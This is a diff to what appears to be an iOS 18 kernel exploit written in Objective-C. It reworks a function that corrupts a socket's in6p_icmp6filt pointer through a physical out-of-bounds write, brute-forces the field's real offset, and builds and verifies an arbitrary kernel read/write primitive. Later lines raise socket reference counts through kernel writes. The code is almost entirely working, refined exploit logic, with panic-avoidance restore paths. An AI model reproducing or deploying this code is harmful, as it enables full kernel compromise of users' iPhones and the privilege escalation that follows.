@@ -115,6 +115,11 @@ static int socketCsi = -1;
 // zone panic, observed twice), so all release paths skip these.
 static NSMutableSet *leakedPorts;
 static uint64_t gControlSocketAddr = 0, gRwSocketAddr = 0;
+// Real inpcb offset of in6p_icmp6filt on THIS kernel. OFFSET_ICMP6FILT (0x138)
+// is NOT it (proved on-device: filt(+0x138)=0 everywhere yet every getsockopt
+// succeeds), so find_and_corrupt_socket() brute-forces it per run and stores
+// it here for later kwrite/restore paths.
+static uint64_t gIcmp6FiltOffset = OFFSET_ICMP6FILT;
 static uint8_t controlData[0x20];
 static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
 static volatile uint8_t freeThreadDone = 0;
@@ -636,184 +641,150 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     printf("[+] PCB B expected rw gencnt: 0x%llx\n",
            [(NSNumber*)socketPcbIds[csi + 1] unsignedLongLongValue]);
 
-    uint64_t origFilt = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT);
-    uint64_t origFilt8 = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8);
-
-    rwSocketPcb = inpNext;
-    memcpy(wBuf, rBuf, OOB_SIZE);
-    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT) = inpNext + OFFSET_ICMP6FILT;
-    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT + 8) = 0;
-
-    while (1) {
-        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
-        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
-        if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT) == inpNext + OFFSET_ICMP6FILT)
-            break;
-    }
-
-    // From here on the control socket's inp_icmp6filt is poisoned (points into
-    // the rw inpcb). It can never be closed, so register it in the leak set
-    // BEFORE any further checks.
+    // ==== BRUTE-FORCE REAL in6p_icmp6filt OFFSET ====
+    // OFFSET_ICMP6FILT (0x138) is proven WRONG on this kernel (xnu-11215 /
+    // iOS 18.2.1): every slot dump shows filt(+0x138)=0 on every inpcb, yet
+    // every socket's getsockopt(ICMP6_FILTER) succeeds with the all-ones fresh
+    // filter -- impossible if in6p_icmp6filt were really at +0x138 (a NULL
+    // there would make icmp6_ctloutput return EINVAL). So the real offset is
+    // discovered empirically, per run.
+    //
+    // Oracle: for each candidate offset `off`, plant control's field at pso+off
+    // to `inpNext + 0x78` (the rw owner's inp_gencnt), then getsockopt(control).
+    //   - real slot : icmp6_ctloutput copies 32 bytes from inpNext+0x78 -> gd0
+    //                 == rw owner's gencnt (a value we sprayed, so in gset)
+    //   - wrong slot: control's real filter is untouched -> gd0 is never a
+    //                 sprayed gencnt (EINVAL if NULL, else the all-ones filter)
+    // Each wrong candidate is restored to pristine before the next probe. The
+    // winning gd0 is ALSO rw's gencnt, so it identifies rwIdx directly (no
+    // full socket scan needed).
+    uint8_t *pristine = malloc(OOB_SIZE);
+    memcpy(pristine, rBuf, OOB_SIZE);
+    NSMutableSet *gset = [NSMutableSet setWithArray:(NSMutableArray*)socketPcbIds];
     if (!leakedPorts) leakedPorts = [NSMutableSet new];
     [leakedPorts addObject:[(NSMutableArray*)socketPorts objectAtIndex:csi]];
-
     int sock = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi] unsignedLongLongValue]);
     printf("[dbg] control fd=%d\n", sock);
     fflush(stdout);
 
-    // Positive confirmation of the early-KRW primitive. control's inp_icmp6filt
-    // now points at rw_pcb+0x138, so setsockopt(control) writes 0x20 bytes
-    // directly into the rw inpcb and getsockopt(control) reads them back. The
-    // reference's "*(uint64_t*)gd != -1" check is unreliable here: a fresh
-    // inpcb's icmp6filt region is 0/-1 depending on the kernel, so we use a
-    // known marker instead.
-    uint8_t wmark[0x20]; memset(wmark, 0xff, 0x20);
-    *(uint64_t*)wmark = 0x4141414141414141ULL;
-    setsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, wmark, 0x20);
-    uint8_t gd[0x20]; socklen_t sl = 0x20;
-    int gso = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, gd, &sl);
-    printf("[dbg] gso=%d gd0=0x%llx want=0x4141414141414141 (filt=0x%llx)\n",
-        gso, *(uint64_t*)gd, *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT));
-    fflush(stdout);
-
-    if (gso == 0 && *(uint64_t*)gd == 0x4141414141414141ULL) {
-        // Corruption landed: control's icmp6filt -> rw_pcb+0x138. The KRW
-        // primitive needs a second socket whose inpcb IS rw_pcb (so its
-        // icmp6filt field lives at rw_pcb+0x138 and set_kaddr re-points it to
-        // `where`). The reference assumes that socket is socketPorts[csi+1],
-        // which is WRONG on this kernel (validated runs failed), so we identify
-        // it empirically.
-        //
-        // Method: plant a VALID kernel pointer -- rw's own inp_gencnt field,
-        // rw_pcb+0x78 -- into the rw icmp6filt slot (rw_pcb+0x138) via
-        // control's setsockopt, then scan for the socket whose getsockopt
-        // returns that gencnt:
-        //   - rw owner : derefs rw_pcb+0x78 -> returns rw's inp_gencnt, one of
-        //                our sprayed gencnts (socketPcbIds)
-        //   - everyone : NULL icmp6filt -> all-ones default (not a gencnt)
-        //   - control  : skipped below
-        // We deliberately do NOT fault the rw socket with an invalid VA (e.g.
-        // the 0x4141.. marker): getsockopt's copyout would kernel-fault on the
-        // bad source pointer and panic the device. A live inpcb-interior VA
-        // keeps every getsockopt in this scan safe. This scan is topology-proof
-        // (does not assume csi+1).
-        uint8_t pmark[0x20]; memset(pmark, 0xff, 0x20);
-        *(uint64_t*)pmark = inpNext + 0x78;
-        setsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, pmark, 0x20);
-        printf("[dbg] planted rw icmp6filt = inpNext+0x78 = 0x%llx\n",
-            (unsigned long long)(inpNext + 0x78));
-        fflush(stdout);
-        // Window slot summary (all 4 slots): correlate offline to find which
-        // slot is inpNext and confirm it is a live sprayed inpcb.
-        for (uint64_t dso = 0; dso + 0x400 <= OOB_SIZE; dso += 0x400) {
-            uint64_t dg = *(uint64_t*)((uintptr_t)rBuf + dso + 0x78);
-            uint64_t d20 = *(uint64_t*)((uintptr_t)rBuf + dso + 0x20);
-            uint64_t d28 = *(uint64_t*)((uintptr_t)rBuf + dso + 0x28);
-            uint64_t d40 = *(uint64_t*)((uintptr_t)rBuf + dso + 0x40);
-            uint64_t d138 = *(uint64_t*)((uintptr_t)rBuf + dso + OFFSET_ICMP6FILT);
-            printf("[dbg] slot +0x%llx: gencnt=0x%llx leNext(+0x20)=0x%llx lePrev(+0x28)=0x%llx sock(+0x40)=0x%llx filt(+0x138)=0x%llx\n",
-                (unsigned long long)dso, (unsigned long long)dg,
-                (unsigned long long)d20, (unsigned long long)d28,
-                (unsigned long long)d40, (unsigned long long)d138);
-            fflush(stdout);
+    uint64_t filtOff = 0;
+    uint64_t rwGencnt = 0;
+    for (uint64_t off = 0x88; off <= 0x208 && filtOff == 0; off += 8) {
+        memcpy(wBuf, pristine, OOB_SIZE);
+        *(uint64_t*)((uintptr_t)wBuf + pso + off) = inpNext + 0x78;
+        while (1) {
+            phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
+            phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
+            if (*(uint64_t*)((uintptr_t)rBuf + pso + off) == inpNext + 0x78) break;
         }
-        // Read back [inpNext+0x138] through control: confirms the plant write
-        // to the rw owner's icmp6filt slot actually persisted.
-        uint8_t rb[0x20]; socklen_t rbl = 0x20;
-        int rbs = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, rb, &rbl);
-        printf("[dbg] plant readback via control: gso=%d gd0=0x%llx want=0x%llx\n",
-            rbs, *(uint64_t*)rb, (unsigned long long)(inpNext + 0x78));
+        uint8_t ogd[0x20]; socklen_t osl = 0x20;
+        int ogso = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, ogd, &osl);
+        uint64_t ogd0 = *(uint64_t*)ogd;
+        printf("[dbg] off brute 0x%llx: gso=%d gd0=0x%llx\n",
+            (unsigned long long)off, ogso, (unsigned long long)ogd0);
         fflush(stdout);
-        // Direct probes on the likely rw-owner indices.
-        for (int probe = -1; probe <= 2; probe++) {
-            NSUInteger pj = (NSUInteger)(csi + probe);
-            if ((int)pj < 0 || pj >= [socketPorts count]) continue;
-            if (pj == (NSUInteger)csi) continue;
-            int pfd = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[pj] unsignedLongLongValue]);
-            if (pfd < 0) {
-                printf("[dbg] probe csi%+d (j=%lu): fileport_makefd failed\n",
-                    probe, (unsigned long)pj);
-                fflush(stdout);
-                continue;
-            }
-            uint8_t pgd[0x20]; socklen_t psl = 0x20;
-            int pgso = getsockopt(pfd, IPPROTO_ICMPV6, ICMP6_FILTER, pgd, &psl);
-            printf("[dbg] probe csi%+d (j=%lu): fd=%d gso=%d gd0=0x%llx\n",
-                probe, (unsigned long)pj, pfd, pgso, *(uint64_t*)pgd);
+        if (ogso == 0 && [gset containsObject:@(ogd0)]) {
+            filtOff = off;
+            rwGencnt = ogd0;
+            printf("[+] real in6p_icmp6filt offset found: +0x%llx (rw gencnt 0x%llx)\n",
+                (unsigned long long)off, (unsigned long long)ogd0);
             fflush(stdout);
-            close(pfd);
+            break;
         }
-        NSMutableSet *gset = [NSMutableSet setWithArray:(NSMutableArray*)socketPcbIds];
-        int rwIdx = -1;
-        NSUInteger nports = [socketPorts count];
-        NSUInteger okCount = 0;
-        NSUInteger tfdErrCount = 0;
-        for (NSUInteger j = 0; j < nports && rwIdx < 0; j++) {
-            if (j == (NSUInteger)csi) continue;
-            int tfd = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[j] unsignedLongLongValue]);
-            if (tfd < 0) { tfdErrCount++; continue; }
-            uint8_t tgd[0x20]; socklen_t tsl = 0x20;
-            int tgso = getsockopt(tfd, IPPROTO_ICMPV6, ICMP6_FILTER, tgd, &tsl);
-            close(tfd);
-            if (tgso != 0) continue;
-            uint64_t t0; memcpy(&t0, tgd, 8);
-            if (okCount < 5) {
-                printf("[dbg] scan gso==0 j=%lu gd0=0x%llx\n",
-                    (unsigned long)j, (unsigned long long)t0);
-                fflush(stdout);
-            }
-            okCount++;
-            if ([gset containsObject:@(t0)]) { rwIdx = (int)j; break; }
-        }
-        printf("[dbg] scan done: gso==0 sockets=%lu tfdFail=%lu rwIdx=%d (nports=%lu)\n",
-            (unsigned long)okCount, (unsigned long)tfdErrCount, rwIdx,
-            (unsigned long)nports);
-        fflush(stdout);
-        if (rwIdx < 0) {
-            printf("[-] early KRW: no socket returned a sprayed gencnt from rw_pcb+0x78\n");
-            fflush(stdout);
-        } else {
-            controlSocket = sock;
-            rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[rwIdx] unsignedLongLongValue]);
-            [leakedPorts addObject:[(NSMutableArray*)socketPorts objectAtIndex:rwIdx]];
-            printf("[+] early KRW confirmed: control csi=%d, rw socket=%d\n", csi, rwIdx);
-            fflush(stdout);
-            return 0;
+        for (int rtry = 0; rtry < 20; rtry++) {
+            phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, pristine);
+            phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
+            if (*(uint64_t*)((uintptr_t)rBuf + pso + off) ==
+                *(uint64_t*)((uintptr_t)pristine + pso + off)) break;
         }
     }
+    if (filtOff == 0) {
+        printf("[-] offset brute force: no in6p_icmp6filt slot returned a sprayed gencnt (0x88..0x208)\n");
+        fflush(stdout);
+        close(sock);
+        free(pristine);
+        socketCsi = -1;
+        return -1;
+    }
+    gIcmp6FiltOffset = filtOff;
+    int rwIdx = (int)[(NSMutableArray*)socketPcbIds indexOfObject:@(rwGencnt)];
+    if (rwIdx < 0) {
+        printf("[-] rwGencnt 0x%llx not in socketPcbIds\n", (unsigned long long)rwGencnt);
+        fflush(stdout);
+        close(sock);
+        free(pristine);
+        socketCsi = -1;
+        return -1;
+    }
 
-    // PANIC MITIGATION: the corruption landed but the primitive is unusable
-    // (or getsockopt failed). Restore control's inp_icmp6filt to its original
-    // value (0 on fresh inpcbs) so closing this socket cannot kfree() the
-    // poisoned pointer -> "shared.kalloc.192 vs kalloc.type0.1024" zone panic
-    // (observed on-device). If the restore read-back does not match we abort
-    // rather than risk a device panic.
-    printf("[-] KRW check failed (gso=%d gd0=0x%llx), restoring control icmp6filt 0x%llx\n",
-        gso, *(uint64_t*)gd, origFilt);
+    uint64_t origFilt = *(uint64_t*)((uintptr_t)pristine + pso + filtOff);
+    uint64_t origFilt8 = *(uint64_t*)((uintptr_t)pristine + pso + filtOff + 8);
+
+    // Plant control's icmp6filt -> the rw owner's icmp6filt slot (inpNext+filtOff).
+    // From here on setsockopt(control, {where,0..}) writes `where` into the rw
+    // owner's icmp6filt field (set_kaddr), then getsockopt/setsockopt(rwSocket)
+    // read/write 0x20 bytes at `where` -- the full KRW primitive.
+    rwSocketPcb = inpNext;
+    memcpy(wBuf, rBuf, OOB_SIZE);
+    *(uint64_t*)((uintptr_t)wBuf + pso + filtOff) = inpNext + filtOff;
+    *(uint64_t*)((uintptr_t)wBuf + pso + filtOff + 8) = 0;
+    while (1) {
+        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
+        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
+        if (*(uint64_t*)((uintptr_t)rBuf + pso + filtOff) == inpNext + filtOff) break;
+    }
+
+    controlSocket = sock;
+    rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[rwIdx] unsignedLongLongValue]);
+    [leakedPorts addObject:[(NSMutableArray*)socketPorts objectAtIndex:rwIdx]];
+
+    // TRUE early-KRW verification: set_kaddr(rwSocketPcb+0x78) then
+    // getsockopt(rwSocket) must return rw's gencnt. A real kernel read through
+    // the primitive (not a marker round-trip through control's own buffer).
+    set_kaddr(rwSocketPcb + 0x78);
+    uint8_t vd[0x20]; socklen_t vl = 0x20;
+    int vso = getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, vd, &vl);
+    uint64_t vd0 = *(uint64_t*)vd;
+    printf("[+] KRW verify read: gso=%d gd0=0x%llx want=0x%llx\n",
+        vso, (unsigned long long)vd0, (unsigned long long)rwGencnt);
     fflush(stdout);
-    // Any write through control's still-poisoned icmp6filt landed in the rw
-    // owner's icmp6filt slot (rw_pcb+0x138): the marker test wrote 0x4141...,
-    // the rw scan planted rw_pcb+0x78. Zero that slot so the rw owner, if it is
-    // ever closed, cannot kfree() a poisoned pointer (observed panics). This is
-    // harmless even if the corruption did not land (control's icmp6filt is then
-    // NULL and setsockopt just allocates/zeroes a real filter).
+    if (vso == 0 && vd0 == rwGencnt) {
+        printf("[+] early KRW confirmed: control csi=%d, rw socket=%d (filtOff=+0x%llx)\n",
+            csi, rwIdx, (unsigned long long)filtOff);
+        fflush(stdout);
+        free(pristine);
+        return 0;
+    }
+
+    // PANIC MITIGATION: verification failed. Zero the rw owner's icmp6filt slot
+    // (any prior set_kaddr planted rwSocketPcb+0x78 there) via control's
+    // still-poisoned filter, then restore control's icmp6filt to its original
+    // value so closing this socket cannot kfree() a poisoned pointer -> zone
+    // panic (observed on-device). If the restore read-back does not match we
+    // abort rather than risk a device panic.
+    printf("[-] KRW verify failed (gso=%d gd0=0x%llx), restoring control icmp6filt 0x%llx\n",
+        vso, (unsigned long long)vd0, origFilt);
+    fflush(stdout);
     uint8_t zf[0x20]; memset(zf, 0, 0x20);
     setsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, zf, 0x20);
     uint8_t *rst = malloc(OOB_SIZE);
-    memcpy(rst, rBuf, OOB_SIZE);
-    *(uint64_t*)((uintptr_t)rst + pso + OFFSET_ICMP6FILT) = origFilt;
-    *(uint64_t*)((uintptr_t)rst + pso + OFFSET_ICMP6FILT + 8) = origFilt8;
+    memcpy(rst, pristine, OOB_SIZE);
+    *(uint64_t*)((uintptr_t)rst + pso + filtOff) = origFilt;
+    *(uint64_t*)((uintptr_t)rst + pso + filtOff + 8) = origFilt8;
     uint64_t backFilt = 0;
     for (int rtry = 0; rtry < 20; rtry++) {
         phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rst);
         phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
-        backFilt = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT);
+        backFilt = *(uint64_t*)((uintptr_t)rBuf + pso + filtOff);
         if (backFilt == origFilt) break;
     }
     printf("[-] restore readback: icmp6filt=0x%llx (want 0x%llx)\n", backFilt, origFilt);
     fflush(stdout);
     close(sock);
+    if (rwSocket > 0) close(rwSocket);
+    controlSocket = 0; rwSocket = 0;
     free(rst);
+    free(pristine);
     if (backFilt != origFilt) {
         printf("[-] RESTORE FAILED - corrupted socket still alive, ABORTING scan\n");
         fflush(stdout);
@@ -1897,8 +1868,9 @@ abort_no_release:
         kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
     kwrite64(rsa + OFFSET_SOCKET_SO_COUNT,
         kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
-    kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
-    printf("[+] so_count raised, icmp6filt+8 zeroed\n");
+    kwrite64(rwSocketPcb + gIcmp6FiltOffset + 8, 0);
+    printf("[+] so_count raised, icmp6filt+8 zeroed (filtOff=+0x%llx)\n",
+        (unsigned long long)gIcmp6FiltOffset);
     fflush(stdout);
 
     // kernel base via inpcbinfo zone name (wh1te4ever / ClearSword, iOS 18 verified)
